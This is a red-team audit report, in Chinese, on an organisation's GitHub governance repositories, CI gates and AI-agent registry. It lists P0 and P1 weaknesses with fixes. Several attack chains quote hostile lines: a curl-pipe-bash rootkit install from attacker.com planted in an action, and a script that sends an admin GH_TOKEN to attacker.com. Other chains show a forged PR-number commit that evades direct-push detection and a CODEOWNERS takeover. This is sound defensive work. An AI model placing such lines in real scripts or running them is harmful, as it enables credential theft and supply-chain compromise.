# Cloudbird-Software 组织治理体系红队测试问题总报告

**报告版本**：v1.0  
**演练日期**：2026-08-19  
**演练范围**：三个治理仓（L0: .github + CI-Workflows；L1: agent-registry；L2: template-service 及业务仓）  
**演练轮次**：3轮（白盒正常流程 / 边界异常场景 / 红队压力渗透）  
**参与测试场景数**：22个主场景 + 55+ case  
**累计发现问题数**：79项（其中P0级22项）

---

## 执行摘要

### 演练方法说明

| 轮次 | 名称 | 测试视角 | 场景数 | 发现问题数 |
|------|------|----------|--------|------------|
| 第一轮 | 正常流程白盒走查 | 模拟4个标准开发流程（建新仓/C1变更/团队生命周期/普通PR），逐步骤核对触发点、门禁、衔接点 | 4大场景 / 24子步骤 | 47项 |
| 第二轮 | 边界与异常场景 | 8大类边界case（REPOS/分级生命周期/身份权限/破玻璃/Actions/语言/测试），模拟"灰色地带" | 8大类 / 30 case | 30项 |
| 第三轮 | 红队压力渗透测试 | 5类攻击（绕硬防线/死锁无人认领/反馈循环耗尽/agent运行时/结构性缺陷），设计10+可执行攻击链 | 5大类 / 12攻击路径 | 新增17项关联问题，综合跨类别揭示3大结构性缺陷 |

### 问题分布总览（按严重度）

| 严重度 | 定义 | 数量 | 占比 |
|--------|------|------|------|
| **P0** | 阻塞流程 / 治理核心防线洞开 / 死锁 / 供应链攻击可实际落地 | **22** | 28% |
| **P1** | 关键校验缺失 / 流程断点 / 长期漏洞 / 无人跟进窗口 | **31** | 39% |
| **P2** | 语义歧义 / 边界不清 / 灰区真空 / 格式不统一 | **16** | 20% |
| **P3** | 效率改进 / 最佳实践 / 体验优化 | **10** | 13% |
| **合计** | | **79** | 100% |

### 3大结构性缺陷（跨类别叠加复合攻击风险极高）

1. **【STRUCT-01】治理监控机制本身不可信**：drift-check 漂移检测的幂等逻辑（标题模糊搜索"治理漂移"）、§8直推正则（可伪造PR号结尾）、9段检测对仓内容零校验，叠加后——攻击者可一次性使**所有治理自动监控永久失明**，配合后续任何攻击都永不被发现。（严重度：P0，综合得分 100/100）

2. **【STRUCT-02】owner 单点 + 治理仓无灾备**：admin==1唯一人 + CODEOWNERS全路径@randypanding + .github / CI-Workflows / agent-registry 三仓无 deletion_protection + 无镜像/冷备/DR runbook。结果：owner休假=全组织开发活动死锁3-14天；owner账号被盗=三仓被删=组织工程体系崩溃。（严重度：P0，综合得分 95/100）

3. **【STRUCT-03】供应链绿色误判三层通道**：CI-Workflows v1 tag可被admin通过release-tags ruleset的bypass覆盖 + dependabot minor/patch auto-merge无hash pin + Actions白名单Cloudbird-Software/*粗粒度放行内部action。三层组合形成一条完整的投毒通道：**修改CI-Workflows gate实现→所有业务仓gate全绿但执行任意代码**。（严重度：P0，综合得分 90/100）

---

## 第一部分：P0级问题清单（22项，必须立即修复）

### P0-01：`gh repo create` 脱机零门禁，建仓流程完全失控
- **来源**：第一轮场景1-S1-01
- **位置**：flows.new_repo 步骤1
- **问题**：`gh repo create` 是本地命令，任何有组织写权限的成员都可创建任意模板、任意visibility的仓；模板选错（不用template-service）、非owner创建、visibility错配等，只能在事后REPOS.yaml申报时被发现，此时仓已真实存在，已构成 GM-4 漂移。
- **攻击面**：非owner成员创建敏感private仓泄露商业代码、绕过治理基线的"野仓"长期存活到下周一drift-check（最多7天）。
- **修复**：
  - 短期：GitHub Org 设置 `members_can_create_repositories=false`（BP-5，需在 apply.sh 强制写入）。
  - 中期：建"仓创建前置审批"issue form，owner ack后由cloudbrid-agent App自动执行创建+初始化。
  - 长期：`new-repo-init.sh` 第一步强制校验调用者==owner + 模板commit hash匹配。

---

### P0-02：CodeQL Default Setup 未自动启用 → 首次功能PR永久死锁
- **来源**：第一轮场景1-S1-02
- **位置**：flows.new_repo 步骤5 + codeql-gate ruleset
- **问题**：codeql-gate ruleset 要求 CodeQL 扫描结果作为 required status check；但 template-service 默认未预置 CodeQL enablement，`new-repo-init.sh` 中也未包含启用步骤。业务仓首个功能PR的required check永远pending，PR无法合并。
- **攻击面**：所有新业务仓第一次提交功能代码即死锁，开发活动物理停滞。
- **修复**：在 `scripts/new-repo-init.sh` 中追加步骤 0.5：
  ```bash
  gh api repos/$ORG/$REPO/code-scanning/default-setup -X PUT \
    -f state=configured -f query_suite=extended
  ```

---

### P0-03：C1跨L0+L1双仓变更无原子性保证
- **来源**：第一轮场景2-S2-01
- **位置**：flows.governance_change C1 scope
- **问题**：C1级变更（如新增archetype）需同时改.github仓（GOVERNANCE.yaml）和agent-registry仓（schema/validate.py），两个仓是独立PR，无法原子合并。中间窗口期（如agent.schema.yaml已合并、GOVERNANCE.yaml AR-8未合并）产生"合法但不合规"的状态，validate.py校验不完整。
- **攻击面**：攻击者可先合schema（放宽约束），再利用"owner忙"的时间窗口让GOVERNANCE延迟合并，窗口内注册违规agent。
- **修复**：
  - 短期：C1级跨仓变更必须在PR描述中含"跨仓依赖束"列表，所有依赖PR必须同时approved后才允许逐个merge。
  - 中期：引入治理变更的"两阶段提交"gateworkflow：第一PR merge后进入pending，第二PR CI验证第一PR已merge才允许pass。

---

### P0-04：apply.sh无merge后自动触发机制
- **来源**：第一轮场景2-S2-02
- **位置**：governance/apply.sh + governance-drift workflow
- **问题**：apply.sh（把治理落盘写到GitHub平台：rulesets/App权限/Actions白名单）完全靠owner手动执行。PR合并后若owner忘跑，则治理规则在平台层悬空最长7天（下周一drift-check才发现）。
- **攻击面**：7天窗口期内新增的ruleset不生效，攻击者可利用旧ruleset的漏洞；App权限变更不生效=agent凭据错误。
- **修复**：新增 `.github/workflows/apply-governance.yml`，触发条件：
  - push to main 且diff触及 governance/GOVERNANCE.yaml / rulesets/*.json / expected-state.json / policy/*.yaml
  - 动作：dry-run → 生成diff报告 → owner在Actions run手动点击"确认apply"按钮 → 执行 apply.sh（环境保护+手动确认=防误写）

---

### P0-05：AR-8族级独立(不同model family)自动化校验缺失
- **来源**：第一轮场景3-S3-01 + 第二轮C4
- **位置**：agent-registry validate.py AR-8校验分支
- **问题**：AR-8要求test-author与judge必须族级独立（不同model family，防止自出卷自判卷）。validate.py只实现了"同声明不同archetype"的本地检查（builder≠test-author不同声明文件），**未实现跨声明的models.yaml family比对**。
- **攻击面**：核心防线洞穿——builder与judge用doubao-pro同family模型=自证自、自出卷自判卷，"可信交付"AR-9链条第一环就断。
- **修复**：validate.py新增 `check_model_family_independence(team_decl)`：
  1. 提取verification.test_authors中所有agent_id → 从registry/agents/*.yaml 中找各自model.alias
  2. 提取builder成员的model.alias
  3. 在models.yaml中查每个alias的family字段，求交集
  4. 交集非空 → validate exit 1

---

### P0-06：Ephemeral团队销毁无自动触发Workflow
- **来源**：第一轮场景3-S3-02
- **位置**：flows.agent_team_lifecycle §4 + team schema AR-6
- **问题**：ephemeral团队完成6项handoff、handoff_done=true后，**没有任何自动化机制销毁团队的runtime资源**（临时App token、团队命名空间OIDC、短期密钥、事件流上下文、临时存储）。销毁完全依赖"人记得手动删"。
- **攻击面**：密钥/token永久残留，严重违反短暂性语义；注册表里僵尸team堆积，N个team后内存+存储泄漏。
- **修复**：新增 agent-registry仓 `.github/workflows/team-destroyer.yml`：
  - 触发：teams/*.yaml PR merge，且diff中 status从active→archived 且 handoff_done=true
  - 动作：调用组织级销毁脚本（revoke installation token、删团队专用secrets、清理事件流命名空间数据），并写 `team_destroyed` 事件入全局事件流

---

### P0-07：`verdict_by=mechanism:verifier` 机制完全未定义
- **来源**：第一轮场景3-S3-03
- **位置**：team.schema.yaml L46 + GOVERNANCE.yaml AR-9
- **问题**：verification链中"判卷"是AR-9可信交付最关键的一环，但 `mechanism:verifier` 到底是什么没有任何定义——是judge archetype agent？是CI job？是human reviewer？需要什么配置？输出什么验真凭证？全未定义。
- **攻击面**：verification声明存在但实际无执行者，所有团队的"可信交付验证链"形同虚设。
- **修复**：
  1. 在 agent.schema.yaml 中扩展 verdict_by 枚举机制白名单：
     - `mechanism:ci-gate-verifier` → 需要verifier CI workflow路径引用
     - `mechanism:judge-agent@<id>` → 需要judge archetype agent_id引用
  2. validate.py校验每种机制配置完整。
  3. 在AR-9文档中明确：verifier必须产生signed verdict artifact，存于archive_to团队。

---

### P0-08：CODEOWNERS `* @randypanding` → 所有业务PR全死锁
- **来源**：第一轮场景4-S4-01 + 第三轮B1攻击
- **位置**：CODEOWNERS + main-protection ruleset(require_code_owner_review=true)
- **问题**：.github仓CODEOWNERS是`* @randypanding`（所有路径），加上ruleset中`require_code_owner_review=true`，结果是：**任何PR（业务代码一行变更/dependabot patch升级/documentation typo）都必须唯一owner @randypanding审批**。
- **连锁后果**：
  - 每天10+PR → owner工作量物理超限，流程不可能跑通。
  - dependabot BP-4 auto-merge功能100%死锁（因为auto-merge的前提是review requirement被满足，但dependabot PR永远缺owner approved comment）。
- **修复**（分层CODEOWNERS，立即执行）：
  ```
  # 治理之治理路径 = owner-only
  /governance/**         @randypanding
  /standards/**          @randypanding
  /scripts/**            @randypanding
  /.github/**            @randypanding
  /CODEOWNERS            @randypanding
  
  # 业务路径 = 业务团队自治（按需创建teams）
  /cmd/                  @Cloudbird-Software/backend-team
  /internal/             @Cloudbird-Software/backend-team
  /pkg/                  @Cloudbird-Software/backend-team
  /docs/                 @Cloudbird-Software/documentation-team
  
  # dependabot PR免owner单审（但仍需gate全绿）
  # 通过在 dependabot.yml 中加 reviewers 配置绕过
  ```

---

### P0-09：MOD-3 模块≤3000行 = 定义不明 + 无拦截脚本
- **来源**：第一轮场景4-S4-02
- **位置**：policy/languages.yaml MOD-3
- **问题**：MOD-3写的是"模块≤3000行，超限拆分"，但：
  1. "模块"定义模糊——是Go module(go.mod)？还是业务边界目录(internal/*)？还是包？
  2. 测试文件(_test.go)计不计入？
  3. CI gate中**完全没有行数统计脚本**，所以3500行的大模块PR不会被拦截，直接合入。
- **攻击面**：MOD-3治理完全空心化，大模块持续膨胀→架构腐化→dep-cruise边界lint失效。
- **修复**：
  1. 明确定义（写进languages.yaml MOD-3注释）："模块=dep-cruise中定义的业务边界模块=internal/* 或 pkg/* 下第一级子目录；生产代码行数=非_test.go文件行数，测试代码折半计入。"
  2. gate新增子项：`python3 scripts/check_module_lines.py --max 3000 --threshold_change 500`（新建目录必检、变化≥500行的已有目录必检）

---

### P0-10：agent-tools planned状态仓已创建但所有检测全skip
- **来源**：第二轮场景A-A4
- **位置**：REPOS.yaml GM-4 + drift-check §7 + repo_baseline gate
- **问题**：REPOS.yaml中 agent-tools 是 status=planned（GM-4：planned 不参与检测）。但如果这个仓**实际上被创建了并在使用**——
  - drift-check §7a/7b：因为它已申报（status=planned≠active不要求存在/不要求一致；又已申报所以不是未申报仓）→ 全跳。
  - repo_baseline gate：planned→全跳。
  - Actions白名单：planned→全跳。
  结果：**agent-tools作为真实在用的仓，所有治理门禁零检查，完全不受控。**
- **修复**：
  1. drift-check新增§7c：status=planned的仓若GitHub API真实存在且创建天数>30天→drift。
  2. 所有gate的"planned-skip"条件改为双重判断：`if status==planned AND repo_not_exists: skip`；若 status==planned 但 repo_exists → 强制按 active 级别跑完整gate。

---

### P0-11：C1 scope 漏列 policy/ 等高影响路径 → 重大变更可绕过治理
- **来源**：第二轮场景B-B2+B3+B4
- **位置**：GOVERNANCE.yaml flows.governance_change.classes[].scope
- **问题**：C1 scope的白名单枚举是：
  ```
  [GOVERNANCE.yaml, rulesets/, expected-state.json, standards/, models.yaml, decisions/]
  ```
  **缺了三个高影响路径**：
  1. `governance/policy/*.yaml`（testing.yaml/languages.yaml）—— 修改T-12强制gate项或允许rust语言，影响面巨大但不命中C1→走普通PR即可合并。
  2. `.github/CODEOWNERS` 和 `.github/settings.*` —— 改CODEOWNERS把owner权限转移出去，是治理根基变更，但白名单没列。
  3. `.github/workflows/*.yml` 的gate逻辑修改。
- **攻击面**：攻击者开PR修改languages.yaml把rust从forbidden移到allowed→不需要ADR、不需要owner-merge→任何approve即过→整套rust工具链+不受控二进制产物引入组织。
- **修复**（立即改GOVERNANCE.yaml flows.C1 scope）：
  ```yaml
  scope:
    - GOVERNANCE.yaml
    - rulesets/
    - expected-state.json
    - standards/
    - models.yaml
    - decisions/
    - policy/                 # 新增：政策文件（语言/测试/依赖）
    - .github/CODEOWNERS      # 新增：所有权形状
    - .github/workflows/      # 新增：CI gate 实现
  ```

---

### P0-12：CODEOWNERS改owner → 可悄悄转移治理权
- **来源**：第二轮B4（与P0-11关联，单独列因为实际攻击可独立执行）
- **攻击链还原**：
  1. 打开PR修改 `.github/CODEOWNERS`，最后一行从 `* @randypanding` 改为 `* @Cloudbird-Software/attackers-team`。
  2. PR命中不到C1 scope（P0-11漏洞），走普通PR。
  3. 但当前生效的CODEOWNERS仍要求@randypanding review——这一步是对的，因为修改CODEOWNERS的PR用的是"老CODEOWNERS"评审。
  4. 所以randypanding必须自己review这条"把自己从owner换掉"的PR——**这没问题**。
  5. **但是**：PR一旦merge，新CODEOWNERS立即生效。之后所有治理仓PR（包括C1级GOVERNANCE.yaml变更）都不再需要randypanding，只需要attackers-team即可。
  6. 攻击者再用attackers-team权限通过下一个PR：修改expected-state.json，把admin改成多个人→正式夺权。
- **关键点**：整个链中**没有任何机制强制"CODEOWNERS变更必须走C1+ADR"**。只要randypanding有一次点错了approve（比如人累了没看清改了什么），权限永久转移。
- **修复**：除了P0-11把CODEOWNERS加入C1 scope外，另加一条：
  - validate.py或PR模板中：凡diff触及CODEOWNERS文件，PR必须打label=`governance-permission-change`，CI自动@randypanding 并附加醒目警告提示框，要求owner在PR comment中显式写出"我确认修改owner权限"的文本。

---

### P0-13：verification.test_authors引用builder archetype = 可自证自
- **来源**：第二轮C3
- **位置**：agent-registry validate.py + team schema verification段
- **问题**：team schema声明"含builder的团队必须verification.test_authors"，但validate.py**只校验test_authors是字符串数组**，不做两件事：
  1. cross-ref到agent声明文件查archetype是不是test-author。
  2. 检查test_authors与builder成员是否来自不同声明（同声明AR-8禁止）。
- **攻击链**：创建team.yaml时写 `verification.test_authors: [agent:my-builder@1.0.0]` → validate.py通过 → builder自己验证自己的代码 → verification链失效。
- **修复**：validate.py新增专项检查：
  ```python
  def check_team_verification(team):
      builders = [m.agent_id for m in team.members if get_archetype(m.agent_id)=="builder"]
      if not builders:
          return  # 无builder团队跳过
      assert team.verification.test_authors, "含builder团队必须test_authors"
      for ta in team.verification.test_authors:
          arch = get_archetype(ta)
          assert arch == "test-author", f"test_author '{ta}' 的 archetype={arch} 不是 test-author"
          assert ta not in builders, f"test_author '{ta}' 同时是builder成员（自证自）"
  ```

---

### P0-14：§8直推检测正则可伪造——破玻璃监控洞穿
- **来源**：第二轮E1 + 第三轮A类攻击变种
- **位置**：drift-check.sh L151
- **问题**：§8判定非PR commit的正则是：
  ```bash
  select(.commit.message | test("[(]#[0-9]+[)]$") | not)
  ```
  意为"commit message末尾不含 `(#数字)` = 直推"。攻击者只需在commit message末尾手动加一个假PR号即可绕开：
  ```
  git commit -m "fix: 后门植入 (#99999)"
  ```
  此commit末尾有`(#99999)`，正则匹配到它→认为是PR commit→跳过→不报漂移。**实际上PR #99999根本不存在**（GitHub上没有这个PR、也没被merge），但drift-check不做二次校验。
- **攻击面**：破玻璃监控完全洞穿，可无限直推main，所有检测都认为是合法PR。配合admin直推权限（OrganizationAdmin bypass ruleset），可永久无痕迹地写入恶意代码。
- **修复**：
  1. 加前置空格防无空格伪造：正则改为 ` \(#[0-9]+\)$`（GitHub自动生成的PR merge commit是 `... (#123)`，必有前置空格）
  2. **增加二次校验**：提取PR号N，调用 `GET /repos/{repo}/pulls/N`，检查 merged=true 且 merge_commit_sha == 当前commit.sha；API 404或sha不匹配→drift，P0级标记。

---

### P0-15：Actions白名单只控来源不控内部行为 → org自有action投毒
- **来源**：第二轮F2 + 第三轮A1+A3关联
- **位置**：expected-state.json actions_policy.patterns_allowed + CI-2
- **问题**：白名单包含 `Cloudbird-Software/*`，意味着org下任何仓作为action被引用都被允许。但CI-2只检查"uses的action路径是否在白名单"，**不检查该action内部实际运行了什么**。
- **攻击链**：
  1. 攻陷Cloudbird-Software/internal-action仓（contributor提交恶意PR，reviewer误批合入），在action.yml新增一行：
     ```yaml
     run: curl -sS https://attacker.com/install-rootkit.sh | bash
     ```
  2. 发布internal-action v1.1.0，更新major tag v1指向新patch（release-tags ruleset有bypass的OrganizationAdmin可以改tag指向）。
  3. 所有引用 `uses: Cloudbird-Software/internal-action@v1` 的业务仓workflows自动执行恶意脚本，CI/CD环境被攻陷，可窃取secrets、写恶意二进制到release artifact。
- **修复**：
  1. 白名单精确化：Cloudbird-Software限定到具体仓，不再通配 `Cloudbird-Software/*`。
  2. org自有action仓每次发版必须走C2+governance-core成员review。
  3. 运行时：所有runner必须启用 `step-security/harden-runner` egress策略，默认禁出站，只允许白名单域名。
  4. 静态：对Cloudbird-Software/* action仓，CI强制跑semgrep规则检测"curl|bash|wget $URL|npm install unpinned|pip install unpinned"等高风险命令。

---

### P0-16：heavy_orm禁止用字符串匹配 → gorm-auto-migrate完全漏
- **来源**：第二轮G2
- **位置**：policy/languages.yaml heavy_orm_forbidden + gate dep-review子项
- **问题**：heavy_orm_forbidden列表是 [prisma, hibernate, gorm-auto-migrate]。dep-review扫描go.mod时：
  - prisma/hibernate能按包名命中（因为它们是独立依赖包名）
  - gorm-auto-migrate不是包名（没人 go get gorm-auto-migrate），它是 `gorm.io/gorm` 库的一个**使用模式**（调用 `db.AutoMigrate(&Model{})`）
  结果：gorm引入完全正常通过，代码中写了`db.AutoMigrate`也无任何CI gate拦。
- **攻击面**：GM-4的"禁heavy_orm"对gorm完全无效，gorm在业务仓中大规模使用→数据库迁移不可控→SQL schema drift。
- **修复**：
  1. languages.yaml中heavy_orm拆分为两个层级：
     - `package_blacklist: [prisma@*, org.hibernate.*, @prisma/client, ...]` → go.mod/package.json级 grep，命中fail。
     - `ast_blacklist: [gorm.io/gorm:AutoMigrate, *:Exec(ALTER TABLE ... DROP COLUMN)]` → 通过go vet自定义规则 + semgrep跨语言AST规则实现，在lint子项gate中跑。
  2. G2立即修复：在golangci-lint配置中加gosec G104（忽略错误）+ 自定义 `gorm-automigrate-ban` vet 规则。

---

### P0-17：T-08 flaky test治理 = 仅有文档，无执行引擎
- **来源**：第二轮H1
- **位置**：policy/testing.yaml T-08
- **问题**：T-08规则是"重跑一次过≠通过；同测试两次飘→隔离+issue"。但：
  - CI（Actions）的rerun是job级重跑，不是test case级trace。
  - 没有系统收集"同一个test case最近7天FAILED次数"。
  - "两次飘→自动开issue + 自动skip隔离"的自动化action完全不存在。
  结果：开发者实际操作就是：test第一次失败→点rerun job→过了→PR绿色→合并。flaky test永远在CI里随机爆炸，永远没人跟进。
- **攻击面**：fake_tests风险敞口之一。flaky=开发者开始ignore红测试→后面真的regression也被当作flaky忽略。
- **修复**：
  1. 引入test case级结果上报：所有测试框架输出JSON格式报告→CI job调用`scripts/flaky_tracker.py`上报到Lark Base或专用数据库（test_id、suite、status、duration、commit_sha、PR_id、run_id）。
  2. 新增`flaky-gate.yml`workflow：PR合并前必跑，查询近7天同test_id FAILED次数≥2→自动在仓内开flaky issue并在下一CI run中skip该case（隔离），直到issue关闭+修复PR merge。
  3. testing.yaml T-08补 `enforcement: gated`。

---

### P0-18：triggered测试(G-01~G-08) = 全部形同虚设
- **来源**：第二轮H2
- **位置**：policy/testing.yaml triggered段
- **问题**：G-01到G-08都带 `trigger=xxx` 字段（first_public_api/sql_layer_landed等），但**完全没有trigger引擎**。
  - G-01 first_public_api：谁来检测"第一次出现public API声明"？CI默认跑的是go test/jest，不会跑API提取diff。
  - G-02 sql_layer_landed：谁检测"SQL层第一次落地"？没人。
  - 其余同理，trigger是什么？trigger条件？怎么激活？全是declarative intent，没有executable engine。
- **攻击面**：触发式测试项的治理成本=0，因为永远不跑。G-01公共API契约漂移、G-03性能回退等风险都敞口。
- **修复**：
  1. testing.yaml中每个triggered项补 `extractor: <工具路径>` 字段，如：
     ```yaml
     - {id: G-01, name: contract_api_drift, tools: oapi-diff, trigger: first_public_api,
        extractor: scripts/extract_go_public_symbols.py, placement: gate}
     ```
  2. CI的gate workflow新增一个always-run步骤：`python scripts/detect_triggers.py`，对每个triggered项跑extractor提取当前状态，与baseline对比，出现trigger条件→对应G项job在下一次CI自动激活并加required check。

---

### P0-19：漂移检测幂等逻辑漏洞 → 假issue可永久淹没真实漂移
- **来源**：第三轮C1攻击（STRUCT-01核心环节）
- **位置**：.github/workflows/governance-drift.yml L36
- **问题**：幂等逻辑：
  ```bash
  EXISTING=$(gh issue list --state open --search "in:title 治理漂移" --json number --jq 'length')
  ```
  漏洞有三：
  1. 搜索关键词是"in:title 治理漂移"——**模糊匹配**，任何标题含这四个字的issue都会被当成"漂移issue已存在"。
  2. **不过滤label/author/特定模板**。
  3. 默认分页30条，如果有>30个假issue，`gh issue list`(不加分页参数)可能漏真实漂移issue的精确匹配。
- **攻击链**：
  1. 任何有仓读权限的人（public仓=任何人）手动创建一个open issue，标题="关于治理漂移的一些建议"，内容随便写。
  2. 之后周一drift-check运行，发现漂移（比如ruleset被改），要开issue。
  3. EXISTING = gh issue list搜索到"治理漂移"四个字在假issue标题里 → length > 0 → 认为已有漂移issue。
  4. 于是**不在新建issue，只在那个假issue里comment追加漂移详情**。
  5. owner看到一个老issue标题是"一些建议"里夹了一堆评论（其中有条是真实漂移，但淹没在其他无关评论中）→ 大概率没注意→ 漂移永久挂着。
  6. 进阶：创建100个不同标题都含"治理漂移"的issue → gh issue list默认返回30条，真实漂移被统计概率性命中→每3周才有1次真能开正确issue。
- **修复**（立即改governance-drift.yml）：
  ```bash
  # 用精确 label + creator + 创建者是github-actions bot 三方过滤
  EXISTING=$(gh issue list --repo "$REPO" --state open \
    --label "governance-drift" \
    --json number,title,labels \
    --jq '[.[] | select(.labels[]?.name=="governance-drift" and (.title | startswith("治理漂移检测：")))] | length')
  ```
  并在创建issue时强制加 label=governance-drift。

---

### P0-20：CI-Workflows v1 tag可覆盖 → 全组织gate投毒通道
- **来源**：第三轮A1攻击（STRUCT-03核心环节）
- **位置**：release-tags ruleset + CI-1（所有业务仓gate引用CI-Workflows@v1）
- **问题**：
  1. CI-1规定所有业务仓的gate引用 `CI-Workflows仓的template-service/.github/workflows/ci.yml@v1`，v1是浮动tag。
  2. release-tags ruleset禁止tag删除/force push/更新。**但是**：
     - bypass_actors中包含OrganizationAdmin(always)
     - admin（唯一owner randypanding）可以bypass ruleset
  3. 所以admin可以：删除v1 tag → 把v1 tag重新指到恶意commit → 所有业务仓的gate workflow下次运行时跑的是恶意代码。
  4. 而且如果admin的账号被盗（STRUCT-02风险），攻击者就是admin，这条链毫无阻力。
- **叠加风险**：如果配合STRUCT-01的漂移issue淹没，§8直推检测被绕→admin覆盖v1 tag的操作也不产生漂移报警→**完美犯罪**。
- **修复**：
  1. release-tags ruleset的bypass_actors中新增限制：tag更新类操作即使是admin也必须走2人审批（需通过"tag release workflow"，不能手动git push tag）。
  2. 所有业务仓引用CI-Workflows必须**pin commit hash**，不能用@v1浮动tag。
  3. CI-Workflows仓每次tag发布必须触发"全组织gate hash更新通知workflow"，自动批量向所有业务仓发dependabot式PR升级hash。

---

### P0-21：CodeQL排除.github仓 → 治理仓脚本后门洞
- **来源**：第三轮A2攻击
- **位置**：rulesets/codeql-gate.json L7 repository_name.exclude = ["AI_Web_School", ".github"]
- **问题**：codeql-gate ruleset明确排除了.github仓。.github仓里有什么？
  - governance/apply.sh：写GitHub API的bash脚本（用org admin token执行，权限最高）
  - governance/drift-check.sh：读GitHub API的bash脚本
  - scripts/gh-app-token.sh：用App私钥换token的脚本（掌握AGENT_APP_SECRET=PEM私钥）
  - scripts/new-repo-init.sh：初始化新仓的脚本
  这些脚本全是**高权限高价值攻击目标**。
- **攻击链**：
  1. 攻陷owner账号（或走破玻璃路径，见P0-14），向.github仓的apply.sh追加一行：
     ```bash
     curl -sS https://attacker.com/steal-token.sh | bash -s -- "$GH_TOKEN"
     ```
  2. CodeQL不扫.github仓→不会扫出后门。
  3. owner下次手动执行apply.sh，bash下载执行远程脚本→admin级GH_TOKEN被发送给攻击者→攻击者拿到org admin token→所有治理防线全部洞穿。
- **修复**：
  1. **立即移除codeql-gate的.github仓排除**（为什么排除？可能是因为认为.github仓代码量小，但脚本才是最高风险代码！）
  2. .github仓所有bash脚本必须加shellcheck静态扫描到gate.yml中，加"禁止未声明变量执行外部命令"的semgrep规则。

---

### P0-22：治理仓三大核心仓无灾备 → 单点故障等于组织级灾难
- **来源**：第三轮E1（STRUCT-02）
- **位置**：跨三个仓（.github / CI-Workflows / agent-registry）的体系级缺失
- **问题**：三个治理仓是整个组织工程体系的"根"，但：
  - .github仓：GitHub上org级.github仓特殊，删了组织profile就没了。
  - CI-Workflows：如果被删，所有业务仓gate workflow报404，所有PR的required check永远pending，所有PR不能合并=全组织开发停滞。
  - agent-registry：如果被清空，所有agent声明/team声明/ADR/模型注册表全部消失，AR-1"唯一落盘"原则下=所有团队无定义、所有validate.py全红、所有agent无法启动。
- **完全缺失的项**：
  - 没有deletion_protection设置（GitHub现在有仓级删除保护，需手动开，apply.sh未包含）
  - 没有冷备镜像仓（跨org备份到另一个GitHub org或另一个git provider）
  - 没有DR runbook（灾难恢复文档，包含恢复步骤、RTO/RPO目标）
  - 没有定期演练恢复流程
- **影响面**（三种场景）：
  1. owner休假10天：B1类单点死锁→所有C1变更、所有dependabot PR、所有业务PR阻塞→组织工程效率降为5%。
  2. owner账号被盗+攻击者删三仓：RTO（恢复时间目标）未知，大概率3-14天完全不可用，期间业务开发完全停滞。
  3. 攻击者配合STRUCT-01漂移issue淹没+STRUCT-03 CI投毒：三仓虽然没被删但实质被控制，后门可潜伏数月不被发现。
- **修复**（分三个时间窗口）：
  - 24h内：开启三仓的deletion_protection；.github仓设为public template以增加一层复制性；owner加2FA硬件密钥。
  - 72h内：创建Cloudbird-Backup org，用GitHub Actions每天对三仓做git push --mirror镜像备份（含所有tag和PR ref）；备份仓加密存储。
  - 1周内：写DR runbook，定义RTO=4h、RPO=24h；每季度模拟一次删仓恢复演练，并把演练结果写ADR。

---

## 第二部分：P1级问题清单（31项，本周内必须开始修复）

| ID | 来源 | 一句话描述 | 影响 |
|----|------|------------|------|
| P1-01 | S1-03 | new-repo-init.sh无幂等性+无基线锚点产物，后续无人能证明仓是否合规初始化 | 初始化后文件可被篡改、gate无法验证基线 |
| P1-02 | S1-04 | REPOS.yaml申报时gate不调用GitHub API回查实际visibility/existence | 不一致的仓声明进入REPOS.yaml后，漂移5-7天后才发现 |
| P1-03 | S1-05 | 业务仓AGENTS.md中agent引用，无AR-2跨仓校验（validate.py只在agent-registry仓跑） | 用户可随意引用未approved的agent，形成"假合规" |
| P1-04 | S2-03 | ADR status流转(proposed→accepted)与PR merge无绑定 | 大量ADR永远停留在proposed，治理追溯混乱 |
| P1-05 | S2-04 | C1新增archetype时，未强制要求同步更新expected-state.json capabilities白名单 | 新archetype的capabilities fail-closed，注册全被拒 |
| P1-06 | S2-05 | drift-check 9段缺少"治理仓内部一致性校验"（schema ↔ GOVERNANCE.yaml ↔ validate.py三方一致） | C1变更漏改后长期不被发现 |
| P1-07 | S3-04 | 事件流存储类型/位置/append-only保证/AR-5拦截平台端强制执行均未定义 | 事件可篡改/可丢失/可被agent静默跳过 |
| P1-08 | S3-05 | 6项handoff动作的完成凭证仅靠retrospective自述，无每项的signed hash收集 | governance-core审核无法验证memory/trace是否伪造 |
| P1-09 | S3-06 | teams/*.yaml的status变更/销毁标记写入权限未限定governance-core专用 | 团队成员自改status=archived+handoff_done=true→虚假销毁 |
| P1-10 | S3-07 | AR-5 no-force-push仅保护main分支；feature分支force push无人管 | 团队可在feature分支rewrite历史、销毁证据 |
| P1-11 | S4-03 | 依赖审批流程仅黑(forbidden)白(允许名单)两态，中间灰区MIT/BSD宽松License无人审 | 引入维护状态差的库、supply chain attack风险敞口 |
| P1-12 | S4-04 | testing.yaml激活项无具体阈值（coverage≥75%? mutation≥60%? race?） | CI gate无法判定pass/fail，测试治理空心化 |
| P1-13 | S4-05 | squash后commit message格式无CI校验，合入后脏消息进main | release notes自动生成混乱，追溯差 |
| P1-14 | S4-06 | CodeQL扫描结果dismiss机制未锁owner-only，cloudbrid-agent理论可消告警 | 中高危CWE被随意dismiss绕过codeql-gate |
| P1-15 | S4-07 | template-service默认仓设置"Automatically delete head branches"开关是否开启未知 | PR合并不删分支→feature分支爆炸 |
| P1-16 | A1 | drift-check §7b的"线上仓未申报"只做单向（REPOS→GitHub）不做双向差分（GitHub-REPOS） | 未申报仓可能漏检（如果API权限不足还会静默失败） |
| P1-17 | A3 | REPOS.yaml exempt语义与expected-state.exclude_repos语义不对齐 | exempt仓被repo_baseline gate拦住，申报人与治理owner踢皮球 |
| P1-18 | B1 | C1级ruleset变更的drift-check-local预检缺ruleset语义合法性校验 | bypass_actors加非Admin Team也能通过预检，留下永久后门 |
| P1-19 | B5 | agent status从proposed→approved可自升，validate.py不校验状态迁移权限 | 任何人可C2 PR里把agent自升为approved |
| P1-20 | C1 | ephemeral team.archive_to指向的persistent team无存在性+type+status校验 | archive_to不存在→销毁失败→团队卡住pending-archive |
| P1-21 | C2 | handoff数组只有"每项值是6枚举之一"校验，无"6项必须全包含"完整性校验 | 声明handoff=[1项]也能validate通过→只做1项就销毁 |
| P1-22 | C5 | persistent team被删/归档时，无反向引用保护检查ephemeral引用它 | governance-core下线后，N个ephemeral归档雪崩死锁 |
| P1-23 | D1 | App权限形状变更的检测仅drift-check周检，无实时webhook | App被加workflows:write权限后，最长7天无检测，窗口足够大 |
| P1-24 | E2 | 破玻璃回填三件套(PR+ADR+drift issue comment)无自动化关联校验 | 缺任一都不报警，形同虚设 |
